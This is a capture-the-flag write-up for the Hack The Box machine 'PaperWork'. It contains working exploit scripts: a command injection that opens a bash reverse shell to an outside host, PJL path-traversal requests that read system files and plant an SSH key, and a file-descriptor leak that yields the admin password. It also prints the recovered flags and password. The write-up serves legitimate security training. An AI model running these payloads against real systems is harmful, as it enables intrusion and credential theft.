# PaperWork

- This is an easy Linux box from Hack The Box. Let’s spawn the machine and grab its IP.
![screenshot](../data/pp1.png)
- I like to perform a quick full-port scan with RustScan.
```
rustscan -a 10.129.248.117 -r 1-65535 --ulimit 5000                                       15s
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/light/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.248.117:22
Open 10.129.248.117:80
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 11:21 +0530
Initiating Ping Scan at 11:21
Scanning 10.129.248.117 [4 ports]
Completed Ping Scan at 11:21, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:21
Completed Parallel DNS resolution of 1 host. at 11:21, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:21
Scanning 10.129.248.117 [2 ports]
Discovered open port 80/tcp on 10.129.248.117
Discovered open port 22/tcp on 10.129.248.117
Completed SYN Stealth Scan at 11:21, 0.81s elapsed (2 total ports)
Nmap scan report for 10.129.248.117
Host is up, received reset ttl 63 (0.35s latency).
Scanned at 2026-10-05 11:21:46 IST for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```
- Ports 22 and 80 are open. Let’s gather more information about these services using Nmap.
```
nmap -sC -sV -p 22,80 10.129.248.117 -oN NMAP_SCAN
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 11:21 +0530
Nmap scan report for 10.129.248.117
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
```
- An Nginx server is running on port 80 and redirects us to `paperwork.htb`. Let’s add this hostname to `/etc/hosts`.
- Visiting the site takes us to a page titled “Corporate Systems: Department of Records & Archives.”

![screenshot](../data/pp2.png)

- We can see a link named `paperwork-archive-v1.02`. Clicking it downloads the `paperwork-archive-v1.02.zip` archive.
- Let’s unzip it:
```
unzip paperwork-archive-v1.02.zip
```
- We now have a `server.py` file. Let’s inspect it:
```
import os
import socket
import threading
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00')
            parts = chunk[1:].decode(errors='ignore').split()
            if not parts:
                continue

            size = int(parts[0])
            content = b""
            while len(content) < size:
                content += self.sock.recv(size - len(content) + 1)

            decoded_content = content.decode(errors='ignore')

            job_name = "Unknown"
            for line in decoded_content.split('\n'):
                line = line.strip()
                if line.startswith('J'):
                    job_name = line[1:]
                    break

            print(f"{self.id} Executing archive for: {job_name}")
            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

            self.sock.send(b'\x00')
            self.sock.send(b'\x00')
            while self.sock.recv(4096):
                pass
            break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```

- Here is what the script does:
- The target runs a custom LPD-like TCP service on port 1515.
- The first byte of the request determines the operation: `0x02` processes a print job, while `0x03` and `0x04` return a status message.

- For a print-job request, the server extracts the printer queue name and checks it against `VALID_QUEUE`. Note that the code uses `queue not in VALID_QUEUE`, which performs a substring-membership check if `VALID_QUEUE` is a string, rather than an exact queue-name comparison.
- It then parses the job data and searches for a line beginning with `J`; the remainder of that line is treated as the job name.
- The job name comes from network-controlled input.
- The application passes this value to:
```
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
- This suggests a possible command-injection vulnerability because the value is interpolated into a shell command and `shell=True` is used.
- Let’s check whether the service is running on the target:
```
 nmap -sC -sV -Pn -p 1515 paperwork.htb                                               28s
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 11:37 +0530
Nmap scan report for paperwork.htb (10.129.248.117)
Host is up (0.68s latency).

PORT     STATE SERVICE        VERSION
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=7%D=10/5%Time=6AC33EAB%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.82 seconds
```
- The service is up and running. Next, let’s interact with it.
- This service imitates parts of the Line Printer Daemon (LPD) protocol, where requests use one-byte command codes. However, the custom implementation on this target does not implement the full standard LPD protocol.
- `\x02` is handled by this custom service as a print-job request. The bytes that follow are interpreted as the queue name (for example, `archive_intake\n`).
- Although standard LPD uses additional command codes and a defined sequence for transferring control and data files, this script uses its own simplified parsing logic. In the code shown, the first byte of each subsequent chunk is assigned to `subcommand`, but it is not used to select a specific operation.
- From the web page, we can identify the target queue as `archive_intake`.

- I wrote the following Python script to obtain a reverse shell:
```
import socket

target_ip = "paperwork.htb"
target_port = 1515
queue_name = "archive_intake"

payload = "myjob'; bash -c 'bash -i >& /dev/tcp/10.10.17.251/1234 0>&1' ; '"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

s.sendall(f"\x02{queue_name}\n".encode())
print("Sent queue selection...", s.recv(1024))

control_content = f"J{payload}\n"
s.sendall(f"\x02 {len(control_content)} cfA001localhost\n".encode())
print("Sent control file header...", s.recv(1024))

s.sendall(control_content.encode() + b"\x00")
print("Payload transmitted.")

s.close()
```
- **Queue selection:** The script opens a TCP connection and sends the `\x02` byte followed by the `archive_intake` queue name.
- **Handshake:** The script reads the server’s null-byte (`\x00`) acknowledgements before sending the next part of the request. These acknowledgements are behavior of this custom service, not proof that it implements the standard LPD handshake.
- **Command injection:** I place the payload in the `J` job-name field. Because the backend inserts this value into a shell command, the single quote and semicolons in the payload break out of the intended `echo` argument and execute a Bash reverse shell.

```
python3 exploit.py
Sent queue selection... b'\x00'
Sent control file header... b'\x00'
Payload transmitted.



nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.17.251] from (UNKNOWN) [10.129.248.117] 33964
bash: cannot set terminal process group (985): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$ 
```

- We got a reverse shell. Let’s stabilize it:
```
lp@paperwork:/home$ which python3
which python3
/usr/bin/python3
lp@paperwork:/home$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
lp@paperwork:/home$ ^Z
[1]  + 69089 suspended  nc -lnvp 1234
  ~/HackTheBox/paperwork ❯ stty raw -echo;fg                                                       ✘ TSTP  5m 52s 
[1]  + 69089 continued  nc -lnvp 1234
                                     export TERM=xterm
```
- We have obtained a shell as the `lp` user.
- Let’s check which other interactive users exist on the system:
```
cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```
- I found a few interesting listening TCP ports:
```
ss -altp
State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess                          
LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*                                    
LISTEN 0      4096         0.0.0.0:ssh         0.0.0.0:*                                    
LISTEN 0      511          0.0.0.0:http        0.0.0.0:*                                    
LISTEN 0      128        127.0.0.1:1337        0.0.0.0:*                                    
LISTEN 0      100          0.0.0.0:1515        0.0.0.0:*    users:(("python3",pid=990,fd=3))
LISTEN 0      4096      127.0.0.54:domain      0.0.0.0:*                                    
LISTEN 0      100        127.0.0.1:9100        0.0.0.0:*                                    
LISTEN 0      4096            [::]:ssh            [::]:*   
``` 
- Let’s investigate the service listening on port 9100:
```
ps -aux  | grep 'archivist'
archivi+     989  0.0  0.4  28040 17648 ?        Ss   03:43   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```
- The `archivist` user is running a printer service on port 9100. Let’s investigate it.
- `jetdirect.py` is a Python script running on TCP port 9100. Port 9100 is commonly associated with raw printing over HP JetDirect/AppSocket, and the script responds to PJL commands.
- The target does not have Netcat, so I’m using Python to interact with the service.

```
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b"@PJL INFO ID\r\n")
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```

- Response

```
HP LASERJET 4ML
```
- This response indicates that the service exposes a printer-like interface that accepts PJL commands.
- The service appears to support PJL-style filesystem commands such as `FSDIRLIST`, `FSUPLOAD`, and `FSDOWNLOAD`, which can list directories, read files, and write files through this implementation.
- List directories:
```
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b"@PJL FSDIRLIST NAME='0:'\r\n")
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```
- Let’s try reading files:

```
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b'@PJL FSUPLOAD NAME="../../../../etc/passwd"\r\n')
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```

```
python3 - <<'PY'
> import socket
> 
> s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
> s.sendall(b'@PJL FSUPLOAD NAME="../../../../etc/passwd"\r\n')
> print(s.recv(4096).decode(errors="replace"))
> s.close()
> PY
@PJL FSUPLOAD NAME="../../../../etc/passwd" SIZE=1672
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:997:997:System Message Bus:/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
_chrony:x:101:103:Chrony daemon:/var/lib/chrony:/usr/sbin/nologin
usbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack:/var/lib/tpm:/bin/false
fwupd-refresh:x:988:988:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:987:65534:sshd user:/run/sshd:/usr/sbin/nologin
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
_laurel:x:999:987::/var/log/laurel:/bin/false
```

- That worked. Let’s try to read `user.txt`:
```
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b'@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt"\r\n')
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```

```
@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
cdc25a68d33ed20219bead482d6ef6e1
```

- **User.txt:** `cdc25a68d33ed20219bead482d6ef6e1`

- Let’s check whether the SSH directory exists:
```
python3 - <<'PY'
> import socket
> 
> s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
> s.sendall(b'@PJL FSDIRLIST NAME="0:/../../../../home/archivist/.ssh"\r\n')
> print(s.recv(4096).decode(errors="replace"))
> s.close()
> PY
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=0
```
- The `.ssh` directory exists. Let’s try to write our public key. First, generate an SSH key pair:

```
ssh-keygen -t ed25519 -f id_ed25519 -N ""
```

```
python3 - <<'PY'
> import socket
> 
> path = "0:/../../../home/archivist/.ssh/authorized_keys"
> pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOx/z/PIjlhEpmeU/rENUNjhBI4jAnVyqmt5w4WsFGe/ red@Debian\n"
> 
> s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
> 
> header = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()
> 
> s.sendall(header)
> s.sendall(pubkey)
> 
> print(s.recv(4096).decode(errors="replace"))
> 
> s.close()
> PY
OK

```
- Now, let’s SSH into the box:
```
ssh -i id_ed25519 archivist@paperwork.htb
Last login: Thu May 28 15:22:41 UTC 2026 from 10.10.14.3 on ssh
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Tue Oct 6 07:04:45 2026 from 10.10.17.251
archivist@paperwork:~$ 
```
## Root access

- The `root` user is running a process named `paperwork-daemon`:
```
root        1483  0.0  0.4  28432 17984 ?        Ss   06:23   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

- Let’s investigate the source code of `paperwork-daemon`:
```
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
evidence_bundle = array.array("i", [log_fd, admin_fd])
msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)
    s.listen(5)

    while True:
        conn, _ = s.accept()
        
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
            
        conn.close()

if __name__ == "__main__":
    main()

```
```
admin_fd = os.open(
        "/etc/paperwork/admin_pins.conf",
        os.O_RDONLY
    )
```
- The daemon opens a sensitive configuration file that contains the admin password and keeps its file descriptor open.
- It also defines a Unix-domain management socket, a local inter-process communication (IPC) endpoint represented by a filesystem path:
```
socket_path = "/run/paperwork/mgmt.sock"
```
- The script also configures the socket’s permissions:

```
os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000) 
```

- The socket is owned by `root:archivist` and has mode `0660`, so members of the `archivist` group have read and write permissions and can connect to it.
```
ls -al /run/paperwork/mgmt.sock 
srw-rw---- 1 root archivist 0 Oct  6 06:23 /run/paperwork/mgmt.sock
```
- The `scan_for_malice()` function searches the log file for the strings `FSQUERY`, `FSUPLOAD`, and `FSDOWNLOAD`. If any of them is present, the daemon enters its lockdown path.
- Our earlier PJL requests are logged, including `FSDOWNLOAD`, so the condition can trigger the lockdown path. The vulnerability is that this path sends open file descriptors to any client that can connect to the management socket.
```
log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

 ```
- `SCM_RIGHTS` allows a process to pass open file descriptors to another process over a Unix-domain socket. Here, the daemon attempts to pass `log_fd` and `admin_fd`.
- When we connect to the socket while the lockdown condition is active, the kernel passes those descriptors to our process. Because the descriptors refer to files already opened by the privileged daemon, we can read their contents, including the admin configuration file.
- I wrote the following Python script to receive the descriptors and read the admin password:
 ```
import socket
import array
import os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

data, ancdata, flags, addr = s.recvmsg(
    4096,
    socket.CMSG_SPACE(10 * array.array("i").itemsize)
)

print(data.decode())

fds = []

for level, msg_type, cmsg_data in ancdata:
    if level == socket.SOL_SOCKET and msg_type == socket.SCM_RIGHTS:

        fd_array = array.array("i")
        fd_array.frombytes(cmsg_data)

        fds.extend(fd_array)

for fd in fds:
    print(fd, os.readlink(f"/proc/self/fd/{fd}"))

    try:
        os.lseek(fd, 0, os.SEEK_SET)
        content = os.read(fd, 4096)

        print(content.decode(errors="replace"))
    except Exception as e:
        print(e)

    os.close(fd)

s.close()
```

```
python3 exploit.py 
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
4 /home/archivist/printer/logs/commands.log
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
[127.0.0.1] connected
Command: @PJL FSDOWNLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=97
Receiving file: 0:/../../../home/archivist/.ssh/authorized_keys (97 bytes)

5 /etc/paperwork/admin_pins.conf
ADMIN_PASSWORD=ApparelMortuaryCedar22
```
- **Admin password:** `ApparelMortuaryCedar22`

- Let’s try to switch to `root`:
```
su root
Password: 
root@paperwork:/tmp# cd /root/
root@paperwork:~# cat root.txt 
f730a39ef4c00d4018c5c658aec2266a
root@paperwork:~# 
```
**Root.txt:** `f730a39ef4c00d4018c5c658aec2266a`